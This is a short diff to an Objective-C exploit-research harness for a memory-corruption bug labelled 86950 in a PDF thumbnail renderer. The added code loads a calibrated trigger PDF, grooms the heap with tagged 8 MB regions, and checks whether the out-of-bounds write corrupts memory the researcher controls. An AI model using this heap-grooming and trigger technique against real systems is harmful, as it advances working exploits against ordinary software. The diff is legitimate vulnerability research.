@@ -291,6 +291,25 @@ NSString *ModCVE86950(void) {
         AvePost(@"86950 verdict: CONTROL failed — the thumbnail path is broken, not the bug");
         return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
     }
+    // The calibrated trigger: DX=31 (the alloca side of the coverage buffer) with
+    // the leaf coordinate at 8000 -- the sweep found leaf 500..4000 render clean
+    // and 8000 kills the process, so the write is live there.  Groom first: with
+    // 64 tagged 8 MB regions ahead of the render, a write that lands inside them
+    // changes the marker, which proves the corruption without needing a crash.
+    NSString *cal = @"lf_dx31_008000.pdf";
+    NSString *calPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:cal];
+    if ([[NSFileManager defaultManager] fileExistsAtPath:calPath]) {
+        AvePost([NSString stringWithFormat:@"86950 CALIBRATED TRIGGER %@ + groom", cal]);
+        int corrupt = ModGroomScan(64, 8 << 20, cal, 32);
+        if (corrupt) {
+            AvePost(@"86950 verdict: HEAP CORRUPTION CONFIRMED in our tagged regions");
+            return [NSString stringWithFormat:@"86950: HEAP CORRUPTION CONFIRMED (%d words "
+                    @"changed in the tagged regions - the write is live and lands in "
+                    @"memory we control)", corrupt];
+        }
+        AvePost(@"86950 groom: no changed words in the tagged regions this run");
+    }
+
     ModSweepLeaf();
     ModSweepChain();
     ModSweepK();
